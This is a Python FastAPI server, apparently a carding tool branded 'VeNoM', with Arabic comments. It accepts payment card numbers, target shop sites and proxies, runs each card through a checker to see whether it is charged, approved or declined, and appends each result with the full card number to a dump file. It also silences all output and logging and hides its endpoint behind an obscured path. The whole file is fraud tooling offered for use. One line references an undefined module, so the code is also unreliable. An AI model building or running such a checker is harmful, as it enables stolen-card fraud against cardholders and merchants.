# checker_api2.py - نسخة محسنة للسرعة القصوى

from __future__ import annotations

import asyncio
import os
import sys
import threading
import time
import logging
import warnings
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Optional
import datetime

warnings.filterwarnings("ignore")

_here = Path(__file__).resolve().parent
if str(_here) not in sys.path:
    sys.path.insert(0, str(_here))

import uvicorn
from fastapi import FastAPI, Request, Query
from fastapi.responses import JSONResponse

import checker_async

# ===== إعدادات السرعة =====
CONCURRENT_PER_SITE = int(os.environ.get("CONCURRENT_PER_SITE", "5"))
POLL_ATTEMPTS = int(os.environ.get("POLL_ATTEMPTS", "8"))
POLL_DELAY_MS = int(os.environ.get("POLL_DELAY_MS", "80"))

# تحديث إعدادات checker_async
checker_async.CONCURRENT_PER_SITE = CONCURRENT_PER_SITE
auto_async.POLL_ATTEMPTS = POLL_ATTEMPTS
auto_async.POLL_DELAY_MS = POLL_DELAY_MS

# ===== إخفاء الـ logs =====
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

logging.basicConfig(level=logging.CRITICAL)
for name in logging.root.manager.loggerDict:
    logging.getLogger(name).disabled = True
    logging.getLogger(name).handlers = []

for name in ["uvicorn", "uvicorn.access", "uvicorn.error", "uvicorn.asgi"]:
    logging.getLogger(name).disabled = True

PORT = int(os.environ.get("CHECKER_PORT", os.environ.get("PORT", "6667")))

_stats = {
    "active":   0,
    "total":    0,
    "charged":  0,
    "approved": 0,
    "declined": 0,
    "errors":   0,
    "by":       "VeNoM",
    "started":  time.strftime("%Y-%m-%d %H:%M:%S"),
    "workers":  CONCURRENT_PER_SITE,
}

_stats_lock = asyncio.Lock()

def _save_dump(card: str, site: str, status: str, result: str, amount: str):
    try:
        with open("dump.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            line = f"[{timestamp}] {status.upper()} | {card} | {site} | {result} | ${amount}\n"
            f.write(line)
            f.flush()
    except Exception:
        pass

@asynccontextmanager
async def _lifespan(app: FastAPI):
    yield

app = FastAPI(title="VeNoM", docs_url=None, redoc_url=None, lifespan=_lifespan)

@app.get("/VeNoM-status")
async def status():
    return JSONResponse({"ok": True, "api": "VeNoM", **_stats})

@app.api_route("/VeNoM-xK9qPm2r", methods=["GET", "POST"])
async def check(
    request: Request,
    cc:    Optional[str] = Query(None),
    site:  Optional[str] = Query(None),
    proxy: Optional[str] = Query(None),
    max_price: Optional[float] = Query(20.0),
):
    if request.method == "POST":
        try:
            body = await request.json()
            cc    = body.get("cc",    cc)
            site  = body.get("site",  site)
            proxy = body.get("proxy", proxy)
            max_price = body.get("max_price", max_price)
        except Exception:
            pass

    if not cc:
        return JSONResponse({"error": "Missing cc"}, status_code=400)
    if not site:
        return JSONResponse({"error": "Missing site"}, status_code=400)

    async with _stats_lock:
        _stats["active"] += 1
        _stats["total"]  += 1

    t0 = asyncio.get_event_loop().time()

    try:
        result = await checker_async.check_card_async(cc, site, proxy or "", max_price)
    except Exception as e:
        async with _stats_lock:
            _stats["errors"] += 1
            _stats["active"] -= 1
        return JSONResponse({
            "Status":   "SiteError",
            "Response": str(e)[:150],
            "Price":    "-",
            "Gateway":  "VeNoM",
            "Card":     cc,
            "site":     site,
            "elapsed":  round(asyncio.get_event_loop().time() - t0, 2),
        })

    elapsed = round(asyncio.get_event_loop().time() - t0, 2)
    status  = result.get("status", "error")

    async with _stats_lock:
        _stats[{"charged":"charged","approved":"approved","declined":"declined"}.get(status,"errors")] += 1
        _stats["active"] -= 1

    if status in ("charged", "approved", "declined"):
        _save_dump(cc, site, status, result.get("result", ""), result.get("amount", "0"))

    bot_status = {"charged":"Charged","approved":"Approved","declined":"Declined"}.get(status,"SiteError")

    return JSONResponse({
        "Status":   bot_status,
        "Response": result.get("result", ""),
        "Price":    result.get("amount", "-"),
        "Gateway":  "VeNoM",
        "Card":     cc,
        "site":     site,
        "elapsed":  elapsed,
    })

if __name__ == "__main__":
    uvicorn.run(
        "checker_api2:app",
        host="0.0.0.0",
        port=PORT,
        loop="uvloop",
        access_log=False,
        log_level="critical",
        backlog=8192,
        timeout_keep_alive=15,
        workers=4,
        limit_concurrency=200,
        log_config=None,
    )
